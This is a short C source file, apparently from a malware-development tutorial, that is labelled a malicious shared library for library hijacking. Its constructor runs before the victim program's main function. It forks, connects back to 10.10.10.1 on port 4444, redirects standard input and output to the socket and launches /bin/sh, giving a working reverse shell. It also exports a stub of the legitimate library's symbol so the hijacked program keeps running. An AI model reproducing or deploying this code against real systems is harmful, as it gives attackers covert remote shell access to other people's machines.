/*
 * evil2.c
 * malicious shared library (hijacker)
 * author: @cocomelonc
 */
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

// constructor runs before the main function of the victim
void __attribute__((constructor)) init() {
  if (fork() == 0) {
    // simulation of a reverse shell or any payload
    printf("evil2.so injected! executing payload...\n");
    // system("touch /tmp/hacked");
    // exit(0);

    // attacker details
    // const char* ip = "127.0.0.1";
    const char* ip = "10.10.10.1";
    int port = 4444;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    // create socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // connect to attacker
    // we use a loop to wait for the listener to be ready
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
      // redirect stdin, stdout, and stderr to the socket
      for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
      }

      // execute shell
      char *args[] = {"/bin/sh", NULL};
      execve("/bin/sh", args, NULL);
    }
  }
}

// export the same symbol as the legit library to prevent crashes
void meow_sound() {
  printf("malicious meow: meow-squeek!\n");
}